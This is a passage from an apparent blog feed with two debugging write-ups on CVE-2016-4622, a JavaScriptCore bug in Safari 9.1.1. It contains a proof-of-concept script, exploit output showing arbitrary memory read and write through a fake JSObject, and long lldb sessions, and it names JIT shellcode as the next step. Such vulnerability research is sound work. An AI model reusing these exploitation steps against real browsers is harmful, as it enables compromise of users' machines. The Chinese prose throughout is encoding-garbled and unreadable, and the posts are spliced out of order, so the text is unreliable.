<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read --format x --size 8 --count 10 0x0000000106c1e170&#10;0x106c1e170: 0x0100150000001134 0x0000000000000000   &#10;0x106c1e180: 0x0118270000001000 0x0000000000000006   --&#62;fakearray[0],fakearray[1]&#10;0x106c1e190: 0x0000000106c173c0 0x0001000000000010   --&#62;fakearray[2],fakearray[3]&#10;0x106c1e1a0: 0x010a170000000031 0x0000000000000000&#10;0x106c1e1b0: 0x0000000106c1e1d0 0x0000000106d8bd80</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„<code>fakearray</code>çš„å€¼å°±æ˜¯ä¸Šé¢çš„<code>0x106c1e180</code>ã€‚</p>
<p>æ‰€ä»¥<code>fakearray[2]</code>æŒ‡å‘äº†<code>vector</code>ï¼Œä¹Ÿå°±æ˜¯<code>hax</code>ã€‚    </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#60;] Reading 8 bytes from 0x0000000106dda180&#10;Process 78730 stopped&#10;* thread #1: tid = 0x30b3dc, 0x000000010034300f JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd7d0) + 15 at ArrayPrototype.cpp:851, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 1.2&#10;    frame #0: 0x000000010034300f JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd7d0) + 15 at ArrayPrototype.cpp:851&#10;   848 &#9;EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)&#10;   849 &#9;&#123;&#10;   850 &#9;    // http://developer.netscape.com/docs/manuals/js/client/jsref/array.htm#1193713 or 15.4.4.10&#10;-&#62; 851 &#9;    JSObject* thisObj = exec-&#62;thisValue().toThis(exec, StrictMode).toObject(exec);&#10;   852 &#9;    if (!thisObj)&#10;   853 &#9;        return JSValue::encode(JSValue());&#10;   854 &#9;    unsigned length = getLength(exec, thisObj);&#10;(lldb) memory read --format x --size 8 --count 10 0x0000000106c173c0&#10;0x106c173c0: 0x01182200000000fa 0x0000000000000000  &#60;--hax:JSCell,hax:m_butterfly&#10;0x106c173d0: 0x0000000106dda180 0x0000000100001000  &#60;--hax:vector&#22320;&#22336;&#21464;&#25104;&#20102;&#35201;&#35835;&#21462;&#30340;&#22320;&#22336;&#10;0x106c173e0: 0x0118270000001132 0x0000000105d9f0d0&#10;0x106c173f0: 0x0000000105d9f0a0 0x0000000000000001&#10;0x106c17400: 0x0118270000001131 0x0000000105d9f0a8&#10;(lldb) c&#10;Process 78730 resuming&#10;[&#62;] Writing 8 bytes to 0x0000000106c1e170&#10;Process 78730 stopped&#10;* thread #1: tid = 0x30b3dc, 0x000000010034300f JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd7d0) + 15 at ArrayPrototype.cpp:851, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 1.2&#10;    frame #0: 0x000000010034300f JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd7d0) + 15 at ArrayPrototype.cpp:851&#10;   848 &#9;EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)&#10;   849 &#9;&#123;&#10;   850 &#9;    // http://developer.netscape.com/docs/manuals/js/client/jsref/array.htm#1193713 or 15.4.4.10&#10;-&#62; 851 &#9;    JSObject* thisObj = exec-&#62;thisValue().toThis(exec, StrictMode).toObject(exec);&#10;   852 &#9;    if (!thisObj)&#10;   853 &#9;        return JSValue::encode(JSValue());&#10;   854 &#9;    unsigned length = getLength(exec, thisObj);&#10;(lldb) memory read --format x --size 8 --count 10 0x0000000106c173c0&#10;0x106c173c0: 0x01182200000000fa 0x0000000000000000 &#60;--hax:JSCell,hax:m_butterfly&#10;0x106c173d0: 0x0000000106c1e170 0x0000000100001000 &#60;--hax:vector&#22320;&#22336;&#21464;&#25104;&#20102;&#35201;&#20889;&#20837;&#30340;&#22320;&#22336;&#10;0x106c173e0: 0x0118270000001132 0x0000000105d9f0d0&#10;0x106c173f0: 0x0000000105d9f0a0 0x0000000000000001&#10;0x106c17400: 0x0118270000001131 0x0000000105d9f0a8&#10;(lldb)</span><br></pre></td></tr></table></figure>
<h1 id="0x04_å°ç»“">0x04 å°ç»“</h1><p>æœ¬æ–‡è®°å½•äº†é€šè¿‡<code>CVE-2016-4622</code>å®ç°ä»»æ„å†…å­˜è¯»å†™çš„è°ƒè¯•æµç¨‹ã€‚æ˜¯<a href="http://turingh.github.io/2016/12/03/CVE-2016-4622%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/">ä¸Šä¸€ç¯‡æ–‡ç« </a>çš„å»¶ç»­ã€‚</p>
<p>æœ‰äº†ä»»æ„å†…å­˜è¯»å†™çš„æ‰‹æ®µä¹‹åï¼Œä¸‹ä¸€æ­¥å°±æ˜¯åˆ©ç”¨<code>JIT</code>è°ƒç”¨<code>shellcode</code>äº†ã€‚</p>
<h1 id="å¼•ç”¨">å¼•ç”¨</h1><p>[1] <a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">http://phrack.org/papers/attacking_javascript_engines.html</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p> æœ¬æ–‡åŸºäº<a href="phrack@saelo.net">saelo</a>åœ¨ <a href="http://phrack.org">phrack</a>ä¸Šå‘è¡¨çš„<a href="http://phrack.org/papers/attacking_javascript_engines.html">Attacking JavaScript Engines</a>ä¸€æ–‡ï¼Œè®°å½•äº†è°ƒè¯•çš„è¿‡ç¨‹ã€‚</p>
<p><a href="https://github.com/saelo/jscpwn">POC</a></p>
<p><a href="http://turingh.github.io/2016/12/03/CVE-2016-4622%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/">CVE-2016-4622è°ƒè¯•ç¬”è®°</a>è®°å½•æœ€åŸºæœ¬çš„æ¼æ´è§¦å‘è¿‡ç¨‹çš„è°ƒè¯•ã€‚</p>
<p>æœ¬æ–‡è®°å½•æ›´é«˜çº§åˆ©ç”¨æŠ€å·§çš„è°ƒè¯•è¿‡ç¨‹ã€‚</p>]]>
    
    </summary>
    
      <category term="javascrip" scheme="http://turingh.github.io/tags/javascrip/"/>
    
      <category term="safari" scheme="http://turingh.github.io/tags/safari/"/>
    
      <category term="webkit" scheme="http://turingh.github.io/tags/webkit/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-4622è°ƒè¯•ç¬”è®°]]></title>
    <link href="http://turingh.github.io/2016/12/03/CVE-2016-4622%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/"/>
    <id>http://turingh.github.io/2016/12/03/CVE-2016-4622è°ƒè¯•ç¬”è®°/</id>
    <published>2016-12-03T21:23:47.000Z</published>
    <updated>2016-12-05T16:08:23.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p> æœ¬æ–‡åŸºäº<a href="phrack@saelo.net">saelo</a>åœ¨ <a href="http://phrack.org" target="_blank" rel="external">phrack</a>ä¸Šå‘è¡¨çš„<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">Attacking JavaScript Engines</a>ä¸€æ–‡ï¼Œè®°å½•äº†è°ƒè¯•çš„è¿‡ç¨‹ã€‚</p>
<p><a href="https://github.com/saelo/jscpwn" target="_blank" rel="external">POC</a></p>
<a id="more"></a>
<h1 id="0x01_ç¯å¢ƒæ­å»º">0x01 ç¯å¢ƒæ­å»º</h1><p>è¿™ä¸ªæ¼æ´å¯ä»¥åœ¨<code>OS X 10.11.5</code>ä¸Šçš„<code>safari 9.1.1</code>é‡ç°ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Setting up container object&#10;[*] Fake JSObject @ 0x000000010d81e180&#10;[*] Float64Array structure ID found: 00001000&#10;[&#60;] Reading 8 bytes from 0x000000010d9da1c0&#10;[&#62;] Writing 8 bytes to 0x000000010d81e170&#10;[&#60;] Reading 16 bytes from 0x000000010d816580&#10;[&#62;] Writing 16 bytes to 0x000000010d81e180&#10;[&#62;] Writing 8 bytes to 0x000000010d81e198&#10;[+] All done!</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯é€šè¿‡<code>lldb</code>ç›´æ¥è°ƒè¯•<code>safari</code>æ˜¯æ²¡æœ‰<code>webkit</code>ç›¸å…³çš„è°ƒè¯•ç¬¦å·çš„ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* thread #1: tid = 0x0a16, 0x00007fff90f9aac0 JavaScriptCore`JSC::arrayProtoFuncSlice(JSC::ExecState*), queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 1.1&#10;    frame #0: 0x00007fff90f9aac0 JavaScriptCore`JSC::arrayProtoFuncSlice(JSC::ExecState*)&#10;JavaScriptCore`JSC::arrayProtoFuncSlice:&#10;-&#62;  0x7fff90f9aac0 &#60;+0&#62;: pushq  %rbp&#10;    0x7fff90f9aac1 &#60;+1&#62;: movq   %rsp, %rbp&#10;    0x7fff90f9aac4 &#60;+4&#62;: pushq  %r15&#10;    0x7fff90f9aac6 &#60;+6&#62;: pushq  %r14&#10;(lldb) p (JSC::ExecState*) $rdi&#10;error: use of undeclared identifier &#39;JSC&#39;&#10;error: expected expression</span><br></pre></td></tr></table></figure>
<p>è‹¹æœå®˜æ–¹è™½ç„¶å¼€æºäº†<code>JavaScriptCore</code>çš„ä»£ç ï¼Œä½†æ˜¯æ²¡æœ‰ç¼–è¯‘è„šæœ¬ã€‚</p>
<p>åœ¨ä¸ç†Ÿæ‚‰<code>JSC</code>çš„æƒ…å†µä¸‹ï¼Œæƒ³è¦å¯¹<code>POC</code>è¿›è¡Œè°ƒè¯•çš„è¯éœ€è¦ä¸‹è½½<code>webkit</code>ï¼Œå¹¶ç¼–è¯‘å­˜åœ¨ç›¸åº”æ¼æ´çš„ç‰ˆæœ¬ï¼Œå°±å¯ä»¥åœ¨æœ‰è°ƒè¯•ç¬¦å·çš„æƒ…å†µä¸‹è¿›è¡Œè°ƒè¯•ã€‚å…·ä½“çš„æºç ä¸‹è½½ä¸ç¼–è¯‘å‚è€ƒ<a href="https://webkit.org/building-webkit/" target="_blank" rel="external">WebKitå®˜ç½‘çš„ç›¸å…³é“¾æ¥</a>ã€‚</p>
<h2 id="1-1_ç¼–è¯‘å‚æ•°">1.1 ç¼–è¯‘å‚æ•°</h2><p><code>Webkit</code>å®˜æ–¹çš„ç¼–è¯‘è„šæœ¬å°†æ‰€æœ‰çš„<code>warning</code>è§†ä¸º<code>error</code>ï¼Œä¼°è®¡æ˜¯æˆ‘ä»¬è°ƒè¯•æ¼æ´çš„ç‰ˆæœ¬ä¸æ˜¯å‘å¸ƒç‰ˆæœ¬ï¼Œæ‰€ä»¥å­˜åœ¨ä¸€äº›<code>warning</code>ä¼šå¯¼è‡´ç¼–è¯‘å¤±è´¥ï¼Œæˆ‘çš„åšæ³•æ˜¯æ‰‹åŠ¨åœ¨é…ç½®æ–‡ä»¶ä¸­å…³é—­è¿™ä¸ªè®¾ç½®ã€‚å…·ä½“æ–¹æ³•æ˜¯å°†<code>WebKit</code>æºç æ–‡ä»¶å¤¹ä¸­æ‰€æœ‰çš„<code>Base.xcconfig</code>ä¸­çš„<code>GCC_TREAT_WARNINGS_AS_ERRORS</code>è®¾ç½®ä¸º<code>NO</code>ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GCC_TREAT_WARNINGS_AS_ERRORS = NO;</span><br></pre></td></tr></table></figure>
<h2 id="1-2_æ¼æ´ç‰ˆæœ¬">1.2 æ¼æ´ç‰ˆæœ¬</h2><p>å°†ä»£ç ç‰ˆæœ¬åˆ‡æ¢åˆ°<code>320b1fc</code>è¿™ä¸ªç‰ˆæœ¬ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">320b1fc 2016-05-03  Geoffrey Garen  &#60;ggaren@apple.com&#62;</span><br></pre></td></tr></table></figure>
<p>åˆ‡æ¢åˆ°ç›®æ ‡ç‰ˆæœ¬ä¹‹åç›´æ¥ç¼–è¯‘å°±å¯ä»¥äº†ã€‚</p>
<p>ç¼–è¯‘è¿‡ç¨‹ä¸­åœ¨<code>WebCore</code>çš„<code>Link</code>æ—¶åº”è¯¥ä¼šæœ‰ä¸€ä¸ªæŠ¥é”™ï¼Œä¿®æ”¹æºç å¤„ç†ä¸€ä¸‹å°±å¥½äº†ã€‚</p>
<h2 id="1-3_é€šè¿‡JSCè°ƒè¯•">1.3 é€šè¿‡JSCè°ƒè¯•</h2><p>åœ¨<code>WebKit/WebKitBuild/Debug</code>ä¸­ä¼šæœ‰ä¸€ä¸ª<code>jsc</code>ï¼Œå°±æ˜¯<code>JavaScriptCore</code>ï¼Œå•ç‹¬è°ƒè¯•è¿™ä¸ª<code>JavaScript</code>çš„å¼•æ“å°±ä¼šç®€å•å¾ˆå¤šã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#10140;  Debug git:(CVE-2016-4622) &#10007; export DYLD_FRAMEWORK_PATH=/Users/XXX/GitHub/WebKit/WebKitBuild/Debug&#10;&#10140;  Debug git:(CVE-2016-4622) &#10007; lldb ./jsc ./poc.js&#10;(lldb) target create &#34;./jsc&#34;&#10;Current executable set to &#39;./jsc&#39; (x86_64).&#10;(lldb) settings set -- target.run-args  &#34;./poc.js&#34;&#10;(lldb) b arrayProtoFuncSlice                                                                                                                                                                                                                      Breakpoint 1: where = JavaScriptCore`JSC::arrayProtoFuncSlice(JSC::ExecState*), address = 0x00000000002a9640&#10;(lldb) r&#10;Process 55066 launched: &#39;./jsc&#39; (x86_64)&#10;1 location added to breakpoint 1&#10;Process 55066 stopped&#10;* thread #1: tid = 0x2606d6, 0x000000010034300f JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 15 at ArrayPrototype.cpp:851, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 1.2&#10;    frame #0: 0x000000010034300f JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 15 at ArrayPrototype.cpp:851&#10;   848 &#9;EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)&#10;   849 &#9;&#123;&#10;   850 &#9;    // http://developer.netscape.com/docs/manuals/js/client/jsref/array.htm#1193713 or 15.4.4.10&#10;-&#62; 851 &#9;    JSObject* thisObj = exec-&#62;thisValue().toThis(exec, StrictMode).toObject(exec);&#10;   852 &#9;    if (!thisObj)&#10;   853 &#9;        return JSValue::encode(JSValue());&#10;   854 &#9;    unsigned length = getLength(exec, thisObj);&#10;(lldb)</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±å¯ä»¥å¸¦ç¬¦å·çš„è°ƒè¯•<code>JSC</code>çš„æ¼æ´äº†ã€‚</p>
<h1 id="0x02_è°ƒè¯•è¿‡ç¨‹">0x02 è°ƒè¯•è¿‡ç¨‹</h1><h2 id="2-1_JSCæ¼æ´">2.1 JSCæ¼æ´</h2><p>æ¼æ´çš„POCä»£ç å¦‚ä¸‹ï¼Œ</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">    a.push(i + <span class="number">0.123</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> b = a.slice(<span class="number">0</span>, &#123;valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; a.length = <span class="number">0</span>; <span class="keyword">return</span> <span class="number">10</span>; &#125;&#125;);</span><br><span class="line">print (b);</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œ<code>poc</code>è„šæœ¬åå¯ä»¥å‘ç°æ¼æ´ç¡®å®å­˜åœ¨ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#10140;  Debug git:(CVE-2016-4622) &#10007; ./jsc ./poc.js&#10;0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0</span><br></pre></td></tr></table></figure>
<p>å…·ä½“çš„æ¼æ´åŸå› åœ¨saeloçš„æ–‡ç« ä¸­å·²ç»è¯´çš„å¾ˆæ¸…æ¥šäº†ï¼Œå¤§è‡´æµç¨‹å¦‚å›¾æ‰€ç¤ºï¼Œç»†èŠ‚è¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œåªè®°å½•è°ƒè¯•è¿‡ç¨‹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-4622/CVE-2016-4622%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0.png" alt="pocè§¦å‘æµç¨‹"></p>
<p>é€šè¿‡åœ¨è¿™ä¸‰ä¸ªå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œåˆ†ææ¼æ´è§¦å‘æµç¨‹ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) b arrayProtoFuncSlice&#10;Breakpoint 1: where = JavaScriptCore`JSC::arrayProtoFuncSlice(JSC::ExecState*), address = 0x00000000002a9640&#10;(lldb) b JSArray::setLength&#10;Breakpoint 2: where = JavaScriptCore`JSC::JSArray::setLength(JSC::ExecState*, unsigned int, bool), address = 0x0000000000089170&#10;(lldb )b ArrayPrototype.cpp:861&#10;Breakpoint 3: where = JavaScriptCore`JSC::arrayProtoFuncSlice(JSC::ExecState*) + 211 at ArrayPrototype.cpp:861, address = 0x00000001003430d3</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process 55532 stopped&#10;* thread #1: tid = 0x26497e, 0x0000000100343040 JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 64 at ArrayPrototype.cpp:852, queue = &#39;com.apple.main-thread&#39;, stop reason = step over&#10;    frame #0: 0x0000000100343040 JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 64 at ArrayPrototype.cpp:852&#10;   849 &#9;&#123;&#10;   850 &#9;    // http://developer.netscape.com/docs/manuals/js/client/jsref/array.htm#1193713 or 15.4.4.10&#10;   851 &#9;    JSObject* thisObj = exec-&#62;thisValue().toThis(exec, StrictMode).toObject(exec);&#10;-&#62; 852 &#9;    if (!thisObj)&#10;   853 &#9;        return JSValue::encode(JSValue());&#10;   854 &#9;    unsigned length = getLength(exec, thisObj);&#10;   855 &#9;    if (exec-&#62;hadException())&#10;(lldb) p *thisObj&#10;(JSC::JSObject) $15 = &#123;&#10;  JSC::JSCell = &#123;&#10;    m_structureID = 77&#10;    m_indexingType = &#39;\a&#39;&#10;    m_type = ObjectType&#10;    m_flags = &#39;\b&#39;&#10;    m_cellState = NewWhite&#10;  &#125;&#10;  m_butterfly = &#123;&#10;    JSC::CopyBarrierBase = (m_value = 0x00000001069e4170)&#10;  &#125;&#10;&#125;&#10;(lldb) memory read --format x --size 8 --count 10 0x00000001069e4170&#10;0x1069e4170: 0x3fbf7ced916872b0 0x3ff1f7ced916872b&#10;0x1069e4180: 0x4000fbe76c8b4396 0x4008fbe76c8b4396&#10;0x1069e4190: 0x40107df3b645a1cb 0x40147df3b645a1cb&#10;0x1069e41a0: 0x40187df3b645a1cb 0x401c7df3b645a1cb&#10;0x1069e41b0: 0x40203ef9db22d0e5 0x40223ef9db22d0e5</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡å¯¹<code>thisObj</code>çš„<code>m_butterfly</code>çš„çš„å†…å­˜å¯ä»¥çœ‹åˆ°æµ®ç‚¹æ•°å­˜å‚¨åœ¨å†…å­˜ä¸­ç›¸åº”çš„ä½ç½®ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process 55532 stopped&#10;* thread #1: tid = 0x26497e, 0x0000000100343076 JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 118 at ArrayPrototype.cpp:855, queue = &#39;com.apple.main-thread&#39;, stop reason = step over&#10;    frame #0: 0x0000000100343076 JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 118 at ArrayPrototype.cpp:855&#10;   852 &#9;    if (!thisObj)&#10;   853 &#9;        return JSValue::encode(JSValue());&#10;   854 &#9;    unsigned length = getLength(exec, thisObj);&#10;-&#62; 855 &#9;    if (exec-&#62;hadException())&#10;   856 &#9;        return JSValue::encode(jsUndefined());&#10;   857&#10;   858 &#9;    unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);&#10;(lldb) p length&#10;(unsigned int) $17 = 100</span><br></pre></td></tr></table></figure>
<p>æ•°ç»„é•¿åº¦æ˜¯<code>100</code>ç¬¦åˆè„šæœ¬æ‰§è¡Œçš„é¢„æœŸç»“æœã€‚</p>
<p>åœ¨æ‰§è¡Œè¿™ä¸€è¡Œä»£ç ï¼Œè·å–<code>slice</code>çš„ç¬¬äºŒä¸ªå‚æ•°æ—¶ä¼šå¯¹<code>a</code>æ‰§è¡Œ<code>setLength</code>å‡½æ•°ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&#62; 859 &#9;    unsigned end = argumentClampedIndexFromStartOrEnd(exec, 1, length, length);</span><br></pre></td></tr></table></figure>
<p>è°ƒç”¨æ ˆå¦‚ä¸‹ï¼Œ</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* thread #1: tid = 0x26497e, 0x0000000100c36f81 JavaScriptCore`JSC::JSArray::setLength(this=0x0000000106fc7ed0, exec=0x00007fff5fbfd190, newLength=0, throwException=false) + 33 at JSArray.cpp:397, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.2&#10;    frame #0: 0x0000000100c36f81 JavaScriptCore`JSC::JSArray::setLength(this=0x0000000106fc7ed0, exec=0x00007fff5fbfd190, newLength=0, throwException=false) + 33 at JSArray.cpp:397&#10;   394&#10;   395 &#9;bool JSArray::setLength(ExecState* exec, unsigned newLength, bool throwException)&#10;   396 &#9;&#123;&#10;-&#62; 397 &#9;    Butterfly* butterfly = m_butterfly.get();&#10;   398 &#9;    switch (indexingType()) &#123;&#10;   399 &#9;    case ArrayClass:&#10;   400 &#9;        if (!newLength)&#10;(lldb) bt&#10;* thread #1: tid = 0x26497e, 0x0000000100c36f81 JavaScriptCore`JSC::JSArray::setLength(this=0x0000000106fc7ed0, exec=0x00007fff5fbfd190, newLength=0, throwException=false) + 33 at JSArray.cpp:397, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.2&#10;  * frame #0: 0x0000000100c36f81 JavaScriptCore`JSC::JSArray::setLength(this=0x0000000106fc7ed0, exec=0x00007fff5fbfd190, newLength=0, throwException=false) + 33 at JSArray.cpp:397&#10;    frame #1: 0x0000000100c362ef JavaScriptCore`JSC::JSArray::put(cell=0x0000000106fc7ed0, exec=0x00007fff5fbfd190, propertyName=PropertyName @ 0x00007fff5fbfced0, value=JSValue @ 0x00007fff5fbfcec8, slot=0x00007fff5fbfcf28) + 511 at JSArray.cpp:206&#10;&#9;frame #2-#18 &#30465;&#30053;&#12290;&#12290;&#12290;&#10;    frame #19: 0x00000001003430d0 JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 208 at ArrayPrototype.cpp:859</span><br></pre></td></tr></table></figure>
<p>è§‚å¯Ÿ<code>this</code>æŒ‡é’ˆï¼Œ</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p *this&#10;(JSC::JSArray) $20 = &#123;&#10;  JSC::JSNonFinalObject = &#123;&#10;    JSC::JSObject = &#123;&#10;      JSC::JSCell = &#123;&#10;        m_structureID = 77&#10;        m_indexingType = &#39;\a&#39;&#10;        m_type = ObjectType&#10;        m_flags = &#39;\b&#39;&#10;        m_cellState = NewWhite&#10;      &#125;&#10;      m_butterfly = &#123;&#10;        JSC::CopyBarrierBase = (m_value = 0x00000001069e4170)&#10;      &#125;&#10;    &#125;&#10;  &#125;&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„<code>this</code>å°±æ˜¯è¿™é’±çš„<code>thisOBj</code>ä¹Ÿå°±æ˜¯è„šæœ¬ä¸­çš„<code>var a</code>ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process 55532 stopped&#10;* thread #1: tid = 0x26497e, 0x0000000100c37277 JavaScriptCore`JSC::JSArray::setLength(this=0x0000000106fc7ed0, exec=0x00007fff5fbfd190, newLength=0, throwException=false) + 791 at JSArray.cpp:434, queue = &#39;com.apple.main-thread&#39;, stop reason = step over&#10;    frame #0: 0x0000000100c37277 JavaScriptCore`JSC::JSArray::setLength(this=0x0000000106fc7ed0, exec=0x00007fff5fbfd190, newLength=0, throwException=false) + 791 at JSArray.cpp:434&#10;   431 &#9;        unsigned lengthToClear = butterfly-&#62;publicLength() - newLength;&#10;   432 &#9;        unsigned costToAllocateNewButterfly = 64; // a heuristic.&#10;   433 &#9;        if (lengthToClear &#62; newLength &#38;&#38; lengthToClear &#62; costToAllocateNewButterfly) &#123;&#10;-&#62; 434 &#9;            reallocateAndShrinkButterfly(exec-&#62;vm(), newLength);&#10;   435 &#9;            return true;&#10;   436 &#9;        &#125;&#10;   437</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>setLength</code>é‡Œé¢å°±ä¼šè§¦å‘å†…å­˜çš„<code>Shrink</code>ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* thread #1: tid = 0x26497e, 0x00000001003430d3 JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 211 at ArrayPrototype.cpp:861, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1&#10;    frame #0: 0x00000001003430d3 JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 211 at ArrayPrototype.cpp:861&#10;   858 &#9;    unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);&#10;   859 &#9;    unsigned end = argumentClampedIndexFromStartOrEnd(exec, 1, length, length);&#10;   860&#10;-&#62; 861 &#9;    std::pair&#60;SpeciesConstructResult, JSObject*&#62; speciesResult = speciesConstructArray(exec, thisObj, end - begin);&#10;   862 &#9;    // We can only get an exception if we call some user function.&#10;   863 &#9;    if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception))&#10;   864 &#9;        return JSValue::encode(jsUndefined());</span><br></pre></td></tr></table></figure>
<p><code>argumentClampedIndexFromStartOrEnd</code>æ‰§è¡Œå®Œäº†ä¹‹åï¼Œ<code>thisObj</code>çš„<code>m_butterfly</code>çš„åœ°å€å‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(JSC::JSObject) $26 = &#123;&#10;  JSC::JSCell = &#123;&#10;    m_structureID = 77&#10;    m_indexingType = &#39;\a&#39;&#10;    m_type = ObjectType&#10;    m_flags = &#39;\b&#39;&#10;    m_cellState = NewWhite&#10;  &#125;&#10;  m_butterfly = &#123;&#10;    JSC::CopyBarrierBase = (m_value = 0x00000001069e4768)&#10;  &#125;&#10;&#125;&#10;&#10;(lldb) memory read --format x --size 8 --count 10 0x00000001069e4768&#10;0x1069e4768: 0x3fbf7ced916872b0 0x3ff1f7ced916872b&#10;0x1069e4778: 0x0000000000000000 0x0000000000000000&#10;0x1069e4788: 0x0000000000000000 0x0000000000000000&#10;0x1069e4798: 0x0000000000000000 0x0000000000000000&#10;0x1069e47a8: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>fastSlice</code>çš„æ•°æ®æ‹·è´å®Œæˆä¹‹åï¼Œå†çœ‹ä¸€ä¸‹<code>thisObj</code>çš„<code>m_bufferfly</code>ã€‚</p>
